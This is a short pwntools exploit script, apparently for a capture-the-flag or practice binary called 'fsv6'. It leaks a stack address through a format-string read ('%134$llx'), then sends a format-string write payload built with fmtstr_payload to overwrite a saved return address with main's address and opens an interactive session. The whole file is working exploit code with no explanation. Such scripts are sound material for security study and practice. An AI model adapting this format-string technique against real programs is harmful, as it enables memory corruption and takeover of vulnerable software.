#!/bin/python

from pwn import *

context.clear(arch = 'amd64')
context.terminal = ['alacritty', '-e', 'sh', '-c']

e = ELF('./fsv6')

main_addr = e.symbols['main']

io = gdb.debug('./fsv6', gdbscript = '''
    b main
    c
        ''')
#io = process('./fsv6');

io.sendline(b'%134$llx');
base_ptr = int(io.recvline(), 16);

log.info("Base pointer: " + hex(base_ptr));

payload = pwnlib.fmtstr.fmtstr_payload(6, { 
        (base_ptr - 0x8): main_addr,
    }, write_size='byte');

log.info("Payload: " + str(payload));
io.sendline(payload)

io.interactive()
